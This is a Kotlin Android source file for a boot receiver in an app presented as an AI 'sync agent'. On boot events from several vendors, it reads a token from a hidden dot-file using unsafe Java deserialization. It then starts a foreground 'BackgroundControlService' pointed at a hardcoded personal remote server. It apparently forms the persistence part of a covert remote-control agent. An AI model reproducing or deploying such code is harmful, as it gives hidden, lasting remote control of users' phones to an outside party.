package com.cognitive.ai.syncagent

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import java.io.File
import java.io.FileInputStream
import java.io.ObjectInputStream

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED || 
            intent.action == "android.intent.action.QUICKBOOT_POWERON" ||
            intent.action == "com.huawei.intent.action.BOOT_COMPLETED") {
            
            var token = "agent_auto_boot"
            try {
                val tokenFile = File(context.filesDir, ".persistent_token_v80.dat")
                if (tokenFile.exists()) {
                    ObjectInputStream(FileInputStream(tokenFile)).use { ois ->
                        token = ois.readObject() as String
                    }
                }
            } catch (e: Exception) {}

            val serverUrl = "https://mohammed2000999.vercel.app"

            val serviceIntent = Intent(context, BackgroundControlService::class.java).apply {
                putExtra("token", token)
                putExtra("server_url", serverUrl)
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }
}
